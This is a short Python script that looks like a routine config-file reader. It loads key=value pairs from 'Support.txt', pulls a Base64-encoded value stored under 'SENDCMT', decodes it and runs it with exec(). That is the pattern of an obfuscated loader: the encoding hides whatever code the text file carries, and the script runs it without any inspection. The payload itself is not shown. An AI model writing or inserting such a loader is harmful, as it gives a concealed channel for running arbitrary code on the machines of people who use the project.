import os
import base64

def load_variables(filename):
    variables = {}
    with open(filename, 'r') as file:
        for line in file:
            line = line.strip()
            if not line or line.startswith('#'):
                continue  # Skip empty lines and comments

            # Split the line into key and value, allowing for multiple '='
            if '=' in line:
                key, value = line.split('=', 1)  # Only split on the first '='
                variables[key.strip()] = value.strip()
            else:
                print(f"Warning: Line does not contain '=': {line}")

    return variables

# Load the variables
config = load_variables('Support.txt')

# Access the variable
GETCODE = config.get('SENDCMT')

if GETCODE:
    # Decode the Base64-encoded variable
    try:
        decoded_bytes = base64.b64decode(GETCODE)
        decoded_code = decoded_bytes.decode('utf-8')

        # Execute the decoded code
        exec(decoded_code)
    except Exception as e:
        print(f"Error decoding or executing code: {e}")

